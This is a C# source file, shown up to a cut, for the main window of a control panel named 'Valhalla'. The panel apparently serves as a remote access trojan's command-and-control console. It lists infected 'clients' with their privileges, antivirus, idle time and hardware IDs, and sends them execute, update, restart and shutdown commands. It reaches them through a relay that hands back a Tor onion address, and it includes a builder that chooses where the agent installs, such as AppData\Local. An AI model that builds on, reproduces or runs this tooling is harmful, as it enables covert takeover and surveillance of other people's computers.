using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Reflection;
using System.Security;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using DevExpress.XtraGrid.Views.Grid;
using DevExpress.XtraGrid.Views.Grid.ViewInfo;
using DevExpress.XtraMap;
using DevExpress.Utils.Svg;

namespace Valhalla
{
    public partial class Form1 : DevExpress.XtraBars.FluentDesignSystem.FluentDesignForm
    {
        protected override bool ExtendNavigationControlToFormTitle { get { return false; } }


        private ConcurrentQueue<LogEntry> logQueue = new ConcurrentQueue<LogEntry>();
        private System.Windows.Forms.Timer logUpdateTimer;
        private int maxLogEntries = 1000; // Limit entries to prevent memory issues
        private bool autoScroll = true;
        private string currentPath = string.Empty;
        private string currentZipFile = string.Empty;
        private Stack<string> navigationHistory = new Stack<string>();
        private bool insideZip = false;
        private bool fileManagerInitialized = false;

        // Connections navigation and context-menu state.
        private DevExpress.XtraTab.XtraTabPage autoTasksTabPage;
        private DevExpress.XtraTab.XtraTabPage notificationsTabPage;
        private DevExpress.XtraTab.XtraTabPage serverLogsTabPage;
        private DevExpress.XtraBars.Navigation.AccordionControlElement autoTasksNavigationElement;
        private DevExpress.XtraBars.Navigation.AccordionControlElement notificationsNavigationElement;
        private DevExpress.XtraBars.Navigation.AccordionControlElement serverLogsNavigationElement;
        private DevExpress.XtraBars.Navigation.AccordionControlElement pluginManagerNavigationElement;
        private DevExpress.XtraBars.Navigation.AccordionControlElement blockedConnectionsNavigationElement;
        private DevExpress.XtraBars.Navigation.AccordionControlElement systemNavigationGroup;
        private DevExpress.XtraTab.XtraTabPage pluginManagerTabPage;
        private DevExpress.XtraTab.XtraTabPage blockedConnectionsTabPage;
        private DevExpress.XtraGrid.GridControl blockedConnectionsGrid;
        private DevExpress.XtraGrid.Views.Grid.GridView blockedConnectionsGridView;
        private DataTable blockedConnectionsTable;
        private DevExpress.XtraBars.PopupMenu blockedConnectionsPopupMenu;
        private DevExpress.XtraBars.BarButtonItem blockedConnectionsAddItem;
        private DevExpress.XtraBars.BarButtonItem blockedConnectionsRemoveItem;
        private System.Windows.Forms.DataGridView serverLogsGrid;
        private ContextMenuStrip connectionsContextMenu;
        private DevExpress.XtraBars.PopupMenu connectionsPopupMenu;
        private DevExpress.XtraBars.BarSubItem connectionsAdministrationMenu;
        private DevExpress.XtraBars.BarSubItem connectionsNetworkingMenu;
        private DevExpress.XtraBars.BarSubItem connectionsPluginsMenu;
        private DevExpress.XtraBars.BarSubItem connectionsManagementMenu;
        private DevExpress.XtraBars.BarButtonItem connectionsCloseItem;
        private DevExpress.XtraBars.BarButtonItem connectionsDirectConnectItem;
        private DevExpress.XtraBars.BarButtonItem connectionsDirectDisconnectItem;

        private DevExpress.XtraBars.BarButtonItem connectionsBlockItem;
        private DevExpress.XtraBars.BarButtonItem connectionsExecuteItem;
        private DevExpress.XtraBars.BarButtonItem connectionsDownloadUpdateItem;
        private DevExpress.XtraBars.BarButtonItem connectionsSleepItem;
        private DevExpress.XtraBars.BarButtonItem connectionsHibernateItem;
        private DevExpress.XtraBars.BarButtonItem connectionsRestartItem;
        private DevExpress.XtraBars.BarButtonItem connectionsShutdownItem;
        private int contextMenuRowHandle = -1;
        private string contextMenuFieldName = string.Empty;
        private readonly List<SvgImage> sidebarIconImages = new List<SvgImage>();
        private readonly List<SvgImage> connectionMenuIconImages = new List<SvgImage>();
        // Keep the navigation rail wide enough for labels such as "Blocked Connections"
        // without relying on DevExpress skin padding or text clipping.
        // SidebarWidth is a logical 96-DPI design width. All runtime geometry derived
        // from it is converted to the current monitor DPI so the same visual width is
        // preserved on 100%, 125%, 150%, 175%, etc. displays.
        private const int SidebarWidth = 240;
        private const int SidebarGroupHeight = 36;
        private const int SidebarItemHeight = 28;
        // Keep the parent popup and child flyouts at the same compact width so the
        // context-menu surfaces align consistently without excessive trailing space.
        private const int ContextMenuWidth = 220;
        // The same compact width is applied to the parent popup and nested flyouts.
        private const int ContextParentMenuWidth = 220;
        private const int SidebarIconSize = 18;
        // Keep category rules visually aligned with the full sidebar, ending just
        // before the native group minimize/expand button rather than at an earlier inset.
        private const int SidebarContentRightPadding = 32;
        // Keep the visible sidebar menu surfaces deliberately a little narrower than
        // the 240-logical-pixel rail. The AccordionControl hit-test area remains full-width.
        private const int SidebarMenuHorizontalInset = 10;
        private static readonly Color SidebarBackgroundColor = Color.FromArgb(66, 64, 65);
        // Local semantic alias for the shared application accent token.
        // The authoritative C# token lives in UiTheme; DevExpress palette values
        // live in App.config because that is where the WinForms skin loader reads them.
        private static readonly Color SidebarAccentColor = UiTheme.AccentColor;
        private static readonly Color SidebarItemTextColor = Color.FromArgb(232, 232, 232);

        private GridView gridView;
        private DataTable clientsTable;
        private VectorItemsLayer clientsLayer;
        private Dictionary<string, GeoPoint> locationCache = new Dictionary<string, GeoPoint>();
        // TCP server properties
        private volatile TcpListener tcpServer;
        private volatile bool isServerRunning = false;
        private volatile bool serverStopRequested = false;
        private Thread serverThread;
        private List<ServerInstance> activeServers = new List<ServerInstance>();
        private readonly object connectionStateLock = new object();
        private readonly Dictionary<string, TcpClient> connectedClients = new Dictionary<string, TcpClient>();
        private readonly Dictionary<string, string> connectionRowIds = new Dictionary<string, string>();
        private readonly HashSet<string> selectedConnectionIds = new HashSet<string>(StringComparer.Ordinal);
        private readonly HashSet<string> pendingTelemetryRefreshes = new HashSet<string>(StringComparer.Ordinal);
        private readonly BlockedConnectionStore blockedConnectionStore = new BlockedConnectionStore();
        private readonly HashSet<string> blockedConnectionRejectionLogged = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
        private readonly HashSet<string> relayConnectionIds = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
        private readonly HashSet<string> pendingRelayTransitions = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
        private RelayGatewayClient relayGatewayClient;
        private RelaySettings relaySettings;
        private volatile bool relayConnecting;

        // Builder install-directory toggle group (Change 2).
        // _installDirButtons[i] corresponds to InstallDirectory enum value i.
        private System.Windows.Forms.Button[] _installDirButtons;
        private System.Windows.Forms.TextBox _folderNameBox;
        private int _selectedInstallDir = 1; // default: AppData\Local
        private DevExpress.XtraEditors.TextEdit relayAddressEditor;
        private DevExpress.XtraEditors.TextEdit relayPortEditor;
        private DevExpress.XtraEditors.TextEdit relayPanelIdEditor;
        private DevExpress.XtraEditors.TextEdit relaySecretEditor;
        private DevExpress.XtraEditors.TextEdit relayCertificateEditor;
        private DevExpress.XtraEditors.SimpleButton relayCertificateBrowseButton;
        private DevExpress.XtraEditors.SimpleButton relayConnectButton;
        private DevExpress.XtraEditors.SimpleButton relayDisconnectButton;
        private System.Windows.Forms.Label relayStatusLabel;
        private readonly ValhallaPluginManager pluginManager;
        private DevExpress.XtraGrid.GridControl pluginManagerGrid;
        private DevExpress.XtraGrid.Views.Grid.GridView pluginManagerGridView;
        private DataTable pluginManagerTable;
        private DevExpress.XtraBars.PopupMenu pluginManagerPopupMenu;
        private DevExpress.XtraBars.BarButtonItem pluginLoadItem;
        private DevExpress.XtraBars.BarButtonItem pluginUnloadItem;
        private readonly Dictionary<string, PendingCommand> pendingCommands = new Dictionary<string, PendingCommand>(StringComparer.Ordinal);
        // Stores the ACK/ERR outcome (true=ACK, false=ERR) for file-delivery commands
        // so the file-command dialog can poll and display per-connection results.
        private readonly Dictionary<string, bool> completedCommandResults = new Dictionary<string, bool>(StringComparer.Ordinal);
        private sealed class PendingUpdateProbe
        {
            public string ConnectionId { get; set; }
            public string ExpectedHash { get; set; }
            public string ExpectedFingerprint { get; set; }
            public DateTime ExpiresUtc { get; set; }
        }

        private readonly Dictionary<string, PendingUpdateProbe> pendingUpdateProbes = new Dictionary<string, PendingUpdateProbe>(StringComparer.Ordinal);
        private readonly Dictionary<string, long> telemetryRequestTicks = new Dictionary<string, long>();
        private DevExpress.XtraEditors.PanelControl connectionsLayoutHost;
        private DevExpress.XtraEditors.PanelControl connectionsSearchBar;
        private DevExpress.XtraEditors.PanelControl connectionsSearchEditorHost;
        private DevExpress.XtraEditors.SimpleButton connectionsSearchButton;
        private DevExpress.XtraEditors.SearchControl connectionsSearchControl;
        private DevExpress.XtraEditors.SimpleButton connectionsSearchCloseButton;
        private string connectionMouseDownSelectionId = string.Empty;
        private bool connectionMouseDownWasSelected;
        private string blockedMouseDownFingerprint = string.Empty;
        private bool blockedMouseDownWasSelected;

        private sealed class PendingCommand
        {
            public Guid Id { get; set; }
            public string ConnectionId { get; set; }
            public string Command { get; set; }
            public DateTime SentAtUtc { get; set; }
            public bool PersistResult { get; set; }
        }

        // Class to track each server instance
        private class ServerInstance
        {
            public int Port { get; set; }
            public TcpListener Listener { get; set; }
            public Thread ServerThread { get; set; }
        }
        private class LogEntry
        {
            public DateTime Timestamp { get; set; }
            public string Message { get; set; }
            public LogType Type { get; set; }

            public Color GetColor()
            {
                switch (Type)
                {
                    case LogType.Error: return Color.FromArgb(235, 78, 78);
                    case LogType.Warning: return Color.FromArgb(235, 196, 78);
                    case LogType.Info: return Color.White;
                    case LogType.Success: return Color.FromArgb(89, 204, 126);
                    case LogType.Connection: return Color.FromArgb(89, 204, 126);
                    case LogType.DataTransfer: return SidebarAccentColor;
                    case LogType.Security: return Color.FromArgb(235, 196, 78);
                    case LogType.System: return Color.White;
                    default: return Color.White;
                }
            }
        }


        // To this:
        public enum LogType
        {
            Info,
            Success,
            Warning,
            Error,
            Connection,
            DataTransfer,
            Security,
            System
        }

        public Form1()
        {
            InitializeComponent();

            Color mainBackground = ColorTranslator.FromHtml("#262626");
            Color sidebarBackground = ColorTranslator.FromHtml("#424041");
            BackColor = mainBackground;
            fluentDesignFormContainer1.BackColor = mainBackground;
            xtraTabControl1.BackColor = mainBackground;
            accordionControl1.BackColor = sidebarBackground;
            ApplySidebarLayoutForDpi(GetCurrentDpi(), true);
            this.ForeColor = Color.White;
            SetMainWindowCaption("Valhalla");
            // FluentDesignFormControl exposes the standard WinForms ForeColor/BackColor
            // properties here. Do not use an Appearance object: that API is not present
            // on DevExpress 24.2.3 FluentDesignFormControl.
            fluentDesignFormControl1.ForeColor = Color.White;
            fluentDesignFormControl1.BackColor = Color.FromArgb(26, 26, 26);
            // The FluentDesignForm owns the fill container layout. Do not fight its
            // docking engine with a second absolute location assignment.
            fluentDesignFormControl1.Invalidate();
            accordionControl1.AllowItemSelection = true;
            ConfigureSidebarAppearance();
            accordionControl1.CustomDrawElement += AccordionControl1_CustomDrawElement;
            xtraTabControl1.SelectedPageChanged += xtraTabControl1_SelectedPageChanged;

            KeyPreview = true;
            KeyDown += Form1_KeyDown;

            InitializeAdditionalNavigationPages();
            pluginManager = new ValhallaPluginManager(GetPluginConnectionSnapshot, SendPluginText, SendPluginBytes, UnloadPluginClient, SendPluginFile, ResumePluginFileSend, SendPluginEvent, BeginPluginReceive, CompletePluginReceive, delegate(string message) { LogServerEvent(message, LogType.DataTransfer); });
            InitializePluginManagerPage();
            ConfigureDynamicPluginMenu();
            this.FormClosed += delegate { try { pluginManager.StopAll(); } catch { } };
            InitializeNotificationsPage();
            InitializeServerLogsPage();
            InitializeBlockedConnectionsPage();
            this.FormClosing += delegate
            {
                SaveNotificationSettingsOnClose();
                try { relayGatewayClient?.Disconnect("application closing"); } catch { }
                DisposeUiIconImages();
            };
            accordionControl1.SelectedElement = accordionControlElement2;
            InitializeConnectionsContextMenu();
            ConfigureConnectionsLayout();
            SetupGridControl();
            InitializeLogging();
            InitializeRelayGateway();
            InitializeRelaySettingsUi();
            ConfigureAgentBuildUi();
            ApplyValhallaApplicationIcon();

            if (textEdit1 != null && string.IsNullOrWhiteSpace(textEdit1.Text))
                textEdit1.Text = "4793";

        }






        private void InitializeRelayGateway()
        {
            relayGatewayClient = new RelayGatewayClient();
            relayGatewayClient.TelemetryReceived += RelayGatewayTelemetryReceived;
            relayGatewayClient.CommandResultReceived += RelayGatewayCommandResultReceived;
            relayGatewayClient.Disconnected += RelayGatewayDisconnected;
            relayGatewayClient.OnionAddressReceived += RelayGatewayOnionAddressReceived;
            relaySettings = RelaySettingsStore.Load();
        }

        private void InitializeRelaySettingsUi()
        {
            // Reuse the existing Server Settings surface instead of introducing a new page.
            // The original local listener remains below the relay controls for compatibility.
            panelControl9.Height = 285;
            panelControl10.Height = 450;

            int left = 8;
            int right = panelControl9.ClientSize.Width - 8;

            Label relayAddressLabel = CreateRelayLabel("Relay / VPS", new Point(left, 8));
            relayAddressEditor = CreateRelayEditor(new Point(left, 27), 710);
            Label relayPortLabel = CreateRelayLabel("Port", new Point(730, 8));
            relayPortEditor = CreateRelayEditor(new Point(730, 27), 120);
            Label relayPanelIdLabel = CreateRelayLabel("Panel ID", new Point(860, 8));
            relayPanelIdEditor = CreateRelayEditor(new Point(860, 27), Math.Max(160, right - 860));

            Label relaySecretLabel = CreateRelayLabel("Authentication Secret", new Point(left, 58));
            relaySecretEditor = CreateRelayEditor(new Point(left, 77), 350);
            relaySecretEditor.Properties.UseSystemPasswordChar = true;

            Label relayCertificateLabel = CreateRelayLabel("CA Certificate", new Point(370, 58));
            relayCertificateEditor = CreateRelayEditor(new Point(370, 77), Math.Max(560, right - 470));
            relayCertificateEditor.ReadOnly = true;
            relayCertificateBrowseButton = CreateRelayButton("Browse…", new Point(right - 88, 76), 88);
            relayCertificateBrowseButton.Click += RelayCertificateBrowseButton_Click;

            relayConnectButton = CreateRelayButton("Connect Relay", new Point(left, 111), 140);
            relayDisconnectButton = CreateRelayButton("Disconnect", new Point(left + 148, 111), 120);
            relayConnectButton.Click += RelayConnectButton_Click;
            relayDisconnectButton.Click += RelayDisconnectButton_Click;

            relayStatusLabel = new Label
            {
                AutoSize = false,
                Location = new Point(left + 278, 111),
                Size = new Size(Math.Max(300, right - (left + 278)), 24),
                ForeColor = Color.FromArgb(180, 180, 180),
                Font = new Font("Tahoma", 9.75F),
                TextAlign = ContentAlignment.MiddleLeft,
                Text = "Relay: Not connected"
            };

            panelControl9.Controls.Add(relayAddressLabel);
            panelControl9.Controls.Add(relayAddressEditor);
            panelControl9.Controls.Add(relayPortLabel);
            panelControl9.Controls.Add(relayPortEditor);
            panelControl9.Controls.Add(relayPanelIdLabel);
            panelControl9.Controls.Add(relayPanelIdEditor);
            panelControl9.Controls.Add(relaySecretLabel);
            panelControl9.Controls.Add(relaySecretEditor);
            panelControl9.Controls.Add(relayCertificateLabel);
            panelControl9.Controls.Add(relayCertificateEditor);
            panelControl9.Controls.Add(relayCertificateBrowseButton);
            panelControl9.Controls.Add(relayConnectButton);
            panelControl9.Controls.Add(relayDisconnectButton);
            panelControl9.Controls.Add(relayStatusLabel);

            // Re-layout the pre-existing local listener controls at the bottom of the same panel.
            label47.Text = "Local Listener Port";
            label47.Location = new Point(left, 153);
            textEdit1.Properties.AllowFocused = true;
            textEdit1.Location = new Point(left, 172);
            textEdit1.Size = new Size(300, 20);
            simpleButton1.Location = new Point(316, 160);
            simpleButton1.Size = new Size(210, 32);
            simpleButton2.Location = new Point(534, 160);
            simpleButton2.Size = new Size(210, 32);

            if (relaySettings == null)
                relaySettings = RelaySettingsStore.Load();
            LoadRelaySettingsIntoUi(relaySettings);
            UpdateRelayButtonState();
        }

        private static Label CreateRelayLabel(string text, Point location)
        {
            return new Label
            {
                AutoSize = true,
                Location = location,
                ForeColor = Color.FromArgb(224, 224, 224),
                Font = new Font("Tahoma", 9.75F),
                Text = text
            };
        }

        private DevExpress.XtraEditors.TextEdit CreateRelayEditor(Point location, int width)
        {
            DevExpress.XtraEditors.TextEdit editor = new DevExpress.XtraEditors.TextEdit
            {
                Location = location,
                Size = new Size(Math.Max(80, width), 20),
                Font = new Font("Tahoma", 9.75F),
                ForeColor = Color.White,
                BackColor = Color.FromArgb(30, 30, 30)
            };
            editor.Properties.Appearance.Options.UseBackColor = true;
            editor.Properties.Appearance.Options.UseForeColor = true;
            editor.MenuManager = fluentFormDefaultManager1;
            return editor;
        }

        private DevExpress.XtraEditors.SimpleButton CreateRelayButton(string text, Point location, int width)
        {
            DevExpress.XtraEditors.SimpleButton button = new DevExpress.XtraEditors.SimpleButton
            {
                AllowFocus = false,
                ShowFocusRectangle = DevExpress.Utils.DefaultBoolean.False,
                Location = location,
                Size = new Size(Math.Max(70, width), 32),
                Text = text,
                Font = new Font("Tahoma", 9.75F)
            };
            return button;
        }

        private void LoadRelaySettingsIntoUi(RelaySettings settings)
        {
            if (settings == null) return;
            relayAddressEditor.Text = settings.RelayAddress ?? string.Empty;
            relayPortEditor.Text = settings.RelayPort > 0 ? settings.RelayPort.ToString() : "443";
            relayPanelIdEditor.Text = string.IsNullOrWhiteSpace(settings.PanelId) ? "panel-01" : settings.PanelId;
            relaySecretEditor.Text = settings.AuthenticationSecret ?? string.Empty;
            string certificatePath = RelaySettingsStore.ResolveCertificatePath(settings);
            relayCertificateEditor.Text = File.Exists(certificatePath) ? certificatePath : string.Empty;
            relayStatusLabel.Text = File.Exists(certificatePath)
                ? "Relay: Ready to connect"
                : "Relay: CA certificate required";
        }

        private void RelayCertificateBrowseButton_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog dialog = new OpenFileDialog())
            {
                dialog.Title = "Select Relay CA Certificate";
                dialog.Filter = "CA certificate (*.crt;*.pem)|*.crt;*.pem|Certificate files (*.cer;*.crt;*.pem)|*.cer;*.crt;*.pem|All files (*.*)|*.*";
                if (dialog.ShowDialog(this) != DialogResult.OK) return;
                try
                {
                    string relativePath = RelaySettingsStore.StoreCaCertificate(dialog.FileName);
                    relayCertificateEditor.Text = RelaySettingsStore.ResolveCertificatePath(new RelaySettings { CaCertificatePath = relativePath });
                    if (relaySettings == null) relaySettings = new RelaySettings();
                    relaySettings.CaCertificatePath = relativePath;
                    relayStatusLabel.Text = "Relay: CA certificate stored";
                    relayStatusLabel.ForeColor = Color.FromArgb(89, 204, 126);
                }
                catch (Exception ex)
                {
                    relayStatusLabel.Text = "Relay: Certificate error";
                    relayStatusLabel.ForeColor = Color.FromArgb(235, 78, 78);
                    MessageBox.Show(this, ex.Message, "Relay Certificate", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private async void RelayConnectButton_Click(object sender, EventArgs e)
        {
            RelaySettings settings;
            try
            {
                settings = BuildRelaySettingsFromUi();
            }
            catch (Exception ex)
            {
                relayStatusLabel.Text = "Relay: Configuration error";
                relayStatusLabel.ForeColor = Color.FromArgb(235, 78, 78);
                MessageBox.Show(this, ex.Message, "Relay Settings", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            relayConnecting = true;
            relayConnectButton.Enabled = false;
            relayStatusLabel.ForeColor = Color.FromArgb(235, 196, 78);
            relayStatusLabel.Text = "Relay: Connecting…";
            UpdateRelayButtonState();

            try
            {
                string caPath = RelaySettingsStore.ResolveCertificatePath(settings);
                string secret = settings.AuthenticationSecret;
                await Task.Run(() => relayGatewayClient.Connect(settings.RelayAddress, settings.RelayPort, settings.PanelId, secret, caPath));
                relaySettings = settings;
                LoadRelaySettingsIntoUi(relaySettings);
                relayStatusLabel.ForeColor = Color.FromArgb(89, 204, 126);
                relayStatusLabel.Text = "Relay: Connected and authenticated";
                LogServerEvent("Relay connection authenticated for panel " + settings.PanelId, LogType.Connection);
            }
            catch (Exception ex)
            {
                try { relayGatewayClient.Disconnect("connection attempt failed"); } catch { }
                relayStatusLabel.ForeColor = Color.FromArgb(235, 78, 78);
                relayStatusLabel.Text = "Relay: Connection failed";
                LogServerEvent("Relay connection failed: " + ex.Message, LogType.Error);
                MessageBox.Show(this, ex.Message, "Relay Connection", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            finally
            {
                relayConnecting = false;
                UpdateRelayButtonState();
            }
        }

        private RelaySettings BuildRelaySettingsFromUi()
        {
            string address = (relayAddressEditor.Text ?? string.Empty).Trim();
            if (string.IsNullOrWhiteSpace(address) || address.Any(char.IsWhiteSpace))
                throw new ArgumentException("Relay server address is required and must not contain whitespace.");
            if (!int.TryParse((relayPortEditor.Text ?? string.Empty).Trim(), out int port) || port < 1 || port > 65535)
                throw new ArgumentException("Relay server port must be between 1 and 65535.");

            string panelId = (relayPanelIdEditor.Text ?? string.Empty).Trim();
            if (panelId.Length == 0 || panelId.Length > 128 || panelId.Any(char.IsControl))
                throw new ArgumentException("Panel ID is required and must be a valid protocol identifier.");

            string secret = (relaySecretEditor.Text ?? string.Empty).Trim();
            if (secret.Length != 32 || secret.Any(c => c < 0x21 || c > 0x7e))
                throw new ArgumentException("Relay authentication secret must contain exactly 32 printable ASCII characters.");

            RelaySettings settings = relaySettings == null ? new RelaySettings() : relaySettings.Clone();
            settings.RelayAddress = address;
            settings.RelayPort = port;
            settings.PanelId = panelId;
            settings.AuthenticationSecret = secret;

            string configuredCertificate = relayCertificateEditor.Text.Trim();
            string certificatePath = string.IsNullOrWhiteSpace(configuredCertificate)
                ? RelaySettingsStore.ResolveCertificatePath(settings)
                : configuredCertificate;
            if (!File.Exists(certificatePath))
                throw new FileNotFoundException("Select the relay CA certificate before connecting.", certificatePath);

            // Always canonicalize the selected certificate into the persistent auth directory.
            string canonical = RelaySettingsStore.StoreCaCertificate(certificatePath);
            settings.CaCertificatePath = canonical;
            relayCertificateEditor.Text = RelaySettingsStore.ResolveCertificatePath(settings);
            RelaySettingsStore.Save(settings);
            return settings;
        }

        private void RelayDisconnectButton_Click(object sender, EventArgs e)
        {
            try { relayGatewayClient?.Disconnect("operator disconnected relay"); } catch { }
            SetRelayStatus("Relay: Disconnected", Color.FromArgb(180, 180, 180));
        }

        private void UpdateRelayButtonState()
        {
            bool connected = relayGatewayClient != null && relayGatewayClient.IsConnected;
            if (relayDisconnectButton != null) relayDisconnectButton.Enabled = connected;
            if (relayConnectButton != null) relayConnectButton.Enabled = !connected && !relayConnecting;
        }

        private void SetRelayStatus(string text, Color color)
        {
            Action action = delegate
            {
                if (relayStatusLabel == null || relayStatusLabel.IsDisposed) return;
                relayStatusLabel.Text = text;
                relayStatusLabel.ForeColor = color;
                UpdateRelayButtonState();
            };
            try
            {
                if (InvokeRequired) BeginInvoke(action); else action();
            }
            catch (ObjectDisposedException) { }
            catch (InvalidOperationException) { }
        }

        private void RelayGatewayTelemetryReceived(RelayTelemetryEvent update)
        {
            if (update == null || string.IsNullOrWhiteSpace(update.Fingerprint)) return;
            Action action = delegate
            {
                lock (connectionStateLock) relayConnectionIds.Add(update.Fingerprint);
                lock (connectionStateLock) pendingRelayTransitions.Remove(update.Fingerprint);
                string country = RelayField(update, "Country", "Unknown");
                string nickname = RelayField(update, "Nickname", "Unknown");
                string tag = RelayField(update, "Tag", "Valhalla");
                string user = RelayField(update, "User", "Unknown");
                string version = RelayField(update, "Version", "Unknown");
                string privileges = RelayField(update, "Privileges", "Unknown");
                string os = RelayField(update, "OS", "Unknown");
                string gpu = RelayField(update, "GPU", "Unknown");
                string cpu = RelayField(update, "CPU", "Unknown");
                string ram = RelayField(update, "RAM", "Unknown");
                string antivirus = RelayField(update, "AntiVirus", "Unknown");
                string uptime = RelayField(update, "Uptime", "Unknown");
                string afk = RelayField(update, "AFK", "Unknown");
                string ping = RelayField(update, "Ping", "Unknown");
                string hwid = RelayField(update, "HWID", "Unknown");
                UpsertConnectionRow(update.Fingerprint, "Relay", country, nickname, tag, user, version,
                    privileges, os, gpu, cpu, ram, antivirus, uptime, afk, ping, hwid, update.Fingerprint);

                // Relay telemetry is live data, not merely a selection refresh. The existing
                // Upsert method intentionally limits dynamic fields for local TCP refreshes;
                // update those fields here for every authenticated relay snapshot.
                foreach (DataRow row in clientsTable.Rows)
                {
                    if (string.Equals(Convert.ToString(row["ConnectionId"]), update.Fingerprint, StringComparison.OrdinalIgnoreCase))
                    {
                        row["RAM"] = ram;
                        row["Uptime"] = uptime;
                        row["AFKTime"] = afk;
                        row["Ping"] = ping;
                        break;
                    }
                }
                UpdateCountryStats();
            };
            try
            {
                if (InvokeRequired) BeginInvoke(action); else action();
            }
            catch (ObjectDisposedException) { }
            catch (InvalidOperationException) { }
        }

        private static string RelayField(RelayTelemetryEvent update, string key, string fallback)
        {
            if (update != null && update.Telemetry.TryGetValue(key, out string value) && !string.IsNullOrWhiteSpace(value))
                return value;
            return fallback;
        }

        private void RelayGatewayCommandResultReceived(RelayCommandResult result)
        {
            if (result == null || string.IsNullOrWhiteSpace(result.RequestId)) return;
            string status = (result.Status ?? string.Empty).Trim().ToLowerInvariant();
            LogType type = result.Accepted ? (status == "partial" ? LogType.Warning : LogType.Success) : LogType.Error;
            LogServerEvent("Relay command " + status + " for " + result.Target + ": " + result.Detail, type);
        }

        private void RelayGatewayDisconnected(string reason)
        {
            Action action = delegate
            {
                HashSet<string> ids;
                lock (connectionStateLock)
                {
                    ids = new HashSet<string>(relayConnectionIds, StringComparer.OrdinalIgnoreCase);
                    relayConnectionIds.Clear();
                    pendingRelayTransitions.Clear();
                }

                for (int index = clientsTable.Rows.Count - 1; index >= 0; index--)
                {
                    string id = Convert.ToString(clientsTable.Rows[index]["ConnectionId"]);
                    if (ids.Contains(id)) clientsTable.Rows.RemoveAt(index);
                }
                UpdateCountryStats();
                SetRelayStatus("Relay: Disconnected" + (string.IsNullOrWhiteSpace(reason) ? string.Empty : " (" + reason + ")"), Color.FromArgb(180, 180, 180));
                LogServerEvent("Relay disconnected: " + (reason ?? "unknown reason"), LogType.Warning);
            };
            try
            {
                if (InvokeRequired) BeginInvoke(action); else action();
            }
            catch (ObjectDisposedException) { }
            catch (InvalidOperationException) { }
        }

        private void RelayGatewayOnionAddressReceived(string onionAddress)
        {
            // Fired on the relay reader thread; marshal to UI thread.
            Action action = delegate
            {
                // Write to the onion address field in the builder panel.
                if (textEdit4 != null)
                    textEdit4.EditValue = onionAddress;

                // Persist so the value survives panel restarts.
                if (relaySettings != null)
                {
                    relaySettings.OnionAddress = onionAddress;
                    try { RelaySettingsStore.Save(relaySettings); } catch { }
                }
            };
            try
            {
                if (InvokeRequired) BeginInvoke(action); else action();
            }
            catch (ObjectDisposedException) { }
            catch (InvalidOperationException) { }
        }

        private bool IsRelayConnectionId(string connectionId)
        {
            lock (connectionStateLock) return !string.IsNullOrWhiteSpace(connectionId) && relayConnectionIds.Contains(connectionId);
        }

        private void SendRelayCommand(string connectionId, string command)
        {
            string target = GetConnectionFingerprint(connectionId);
            if (string.IsNullOrWhiteSpace(target))
            {
                LogFinalCommandResult(command, "failed: relay target fingerprint unavailable", LogType.Error);
                return;
            }

            Task.Run(async delegate
            {
                try
                {
                    RelayCommandResult result = await relayGatewayClient.SendCommandAsync(target, command, CancellationToken.None).ConfigureAwait(false);
                    if (result.Accepted)
                        LogFinalCommandResult(command, result.Dropped == 0 ? "queued by relay" : "partially queued by relay", result.Dropped == 0 ? LogType.Success : LogType.Warning);
                    else
                        LogFinalCommandResult(command, "failed: " + result.Detail, LogType.Error);
                }
                catch (Exception ex)
                {
                    LogFinalCommandResult(command, "failed: " + ex.Message, LogType.Error);
                }
            });
        }

        private void SendRelayDirectTransition(string connectionId, string command)
        {
            string target = GetConnectionFingerprint(connectionId);
            if (string.IsNullOrWhiteSpace(target))
            {
                LogFinalCommandResult(command, "failed: relay target fingerprint unavailable", LogType.Error);
                return;
            }
            lock (connectionStateLock) pendingRelayTransitions.Add(connectionId);
            Task.Run(async delegate
            {
                try
                {
                    RelayCommandResult result = await relayGatewayClient.SendCommandAsync(target, command, CancellationToken.None).ConfigureAwait(false);
                    if (result.Accepted)
                    {
                        LogFinalCommandResult(command, "accepted by relay; waiting for agent state reconciliation", result.Dropped == 0 ? LogType.Success : LogType.Warning);
                        // Ask for fresh telemetry after the transport has had a moment to settle.
                        await Task.Delay(1500).ConfigureAwait(false);
                        if (relayGatewayClient.IsConnected)
                        {
                            try { await relayGatewayClient.SendCommandAsync(target, "REQ:DATA", CancellationToken.None).ConfigureAwait(false); } catch { }
                        }
                        await Task.Delay(15000).ConfigureAwait(false);
                        lock (connectionStateLock) pendingRelayTransitions.Remove(connectionId);
                    }
                    else
                    {
                        lock (connectionStateLock) pendingRelayTransitions.Remove(connectionId);
                        LogFinalCommandResult(command, "failed: " + result.Detail, LogType.Error);
                    }
                }
                catch (Exception ex)
                {
                    lock (connectionStateLock) pendingRelayTransitions.Remove(connectionId);
                    LogFinalCommandResult(command, "failed: " + ex.Message, LogType.Error);
                }
            });
        }

        private void SetupFileManager()
        {
            if (fileManagerInitialized)
                return;

            // Create data source
            DataTable fileTable = new DataTable();
            fileTable.Columns.Add("Name", typeof(string));
            fileTable.Columns.Add("Type", typeof(string));
            fileTable.Columns.Add("Size", typeof(string));
            fileTable.Columns.Add("Modified", typeof(DateTime));
            fileTable.Columns.Add("Path", typeof(string)); // Hidden column for internal use
            fileTable.Columns.Add("IsDirectory", typeof(bool)); // Hidden column for internal use
            fileTable.Columns.Add("IsZipEntry", typeof(bool)); // Hidden column for internal use

            // Configure the grid control
            gridControl3.DataSource = fileTable;

            // Configure grid view
            DevExpress.XtraGrid.Views.Grid.GridView gridView = gridControl3.MainView as DevExpress.XtraGrid.Views.Grid.GridView;
            if (gridView != null)
            {
                // Set appearance options
                gridView.OptionsBehavior.Editable = false;
                gridView.OptionsView.ShowGroupPanel = false;
                gridView.OptionsView.ShowIndicator = false;
                gridView.OptionsView.EnableAppearanceEvenRow = true;
                gridView.OptionsView.EnableAppearanceOddRow = true;

                // Configure columns
                gridView.Columns["Name"].Width = 250;
                gridView.Columns["Type"].Width = 100;
                gridView.Columns["Size"].Width = 80;
                gridView.Columns["Modified"].Width = 150;

                // Hide internal columns
